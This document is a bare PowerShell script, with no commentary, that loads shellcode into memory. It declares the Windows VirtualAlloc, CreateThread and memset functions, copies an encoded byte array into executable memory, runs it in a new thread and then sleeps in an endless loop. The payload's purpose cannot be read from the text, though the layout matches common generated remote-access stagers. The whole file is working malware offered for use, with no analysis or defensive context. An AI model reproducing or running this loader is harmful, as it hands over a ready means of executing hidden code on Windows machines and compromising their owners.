$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xba,0x92,0xe8,0x3a,0x10,0xda,0xd4,0xd9,0x74,0x24,0xf4,0x5e,0x29,0xc9,0xb1,0x47,0x31,0x56,0x13,0x03,0x56,0x13,0x83,0xee,0x6e,0x0a,0xcf,0xec,0x66,0x49,0x30,0x0d,0x76,0x2e,0xb8,0xe8,0x47,0x6e,0xde,0x79,0xf7,0x5e,0x94,0x2c,0xfb,0x15,0xf8,0xc4,0x88,0x58,0xd5,0xeb,0x39,0xd6,0x03,0xc5,0xba,0x4b,0x77,0x44,0x38,0x96,0xa4,0xa6,0x01,0x59,0xb9,0xa7,0x46,0x84,0x30,0xf5,0x1f,0xc2,0xe7,0xea,0x14,0x9e,0x3b,0x80,0x66,0x0e,0x3c,0x75,0x3e,0x31,0x6d,0x28,0x35,0x68,0xad,0xca,0x9a,0x00,0xe4,0xd4,0xff,0x2d,0xbe,0x6f,0xcb,0xda,0x41,0xa6,0x02,0x22,0xed,0x87,0xab,0xd1,0xef,0xc0,0x0b,0x0a,0x9a,0x38,0x68,0xb7,0x9d,0xfe,0x13,0x63,0x2b,0xe5,0xb3,0xe0,0x8b,0xc1,0x42,0x24,0x4d,0x81,0x48,0x81,0x19,0xcd,0x4c,0x14,0xcd,0x65,0x68,0x9d,0xf0,0xa9,0xf9,0xe5,0xd6,0x6d,0xa2,0xbe,0x77,0x37,0x0e,0x10,0x87,0x27,0xf1,0xcd,0x2d,0x23,0x1f,0x19,0x5c,0x6e,0x77,0xee,0x6d,0x91,0x87,0x78,0xe5,0xe2,0xb5,0x27,0x5d,0x6d,0xf5,0xa0,0x7b,0x6a,0xfa,0x9a,0x3c,0xe4,0x05,0x25,0x3d,0x2c,0xc1,0x71,0x6d,0x46,0xe0,0xf9,0xe6,0x96,0x0d,0x2c,0x92,0x93,0x99,0xea,0x7f,0x06,0x95,0x9d,0x7d,0x36,0x07,0xcd,0x0b,0xd0,0x17,0xa1,0x5b,0x4d,0xd7,0x11,0x1c,0x3d,0xbf,0x7b,0x93,0x62,0xdf,0x83,0x79,0x0b,0x75,0x6c,0xd4,0x63,0xe1,0x15,0x7d,0xff,0x90,0xda,0xab,0x85,0x92,0x51,0x58,0x79,0x5c,0x92,0x15,0x69,0x08,0x52,0x60,0xd3,0x9e,0x6d,0x5e,0x7e,0x1e,0xf8,0x65,0x29,0x49,0x94,0x67,0x0c,0xbd,0x3b,0x97,0x7b,0xb6,0xf2,0x0d,0xc4,0xa0,0xfa,0xc1,0xc4,0x30,0xad,0x8b,0xc4,0x58,0x09,0xe8,0x96,0x7d,0x56,0x25,0x8b,0x2e,0xc3,0xc6,0xfa,0x83,0x44,0xaf,0x00,0xfa,0xa3,0x70,0xfa,0x29,0x32,0x4c,0x2d,0x17,0x40,0xbc,0xed;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};
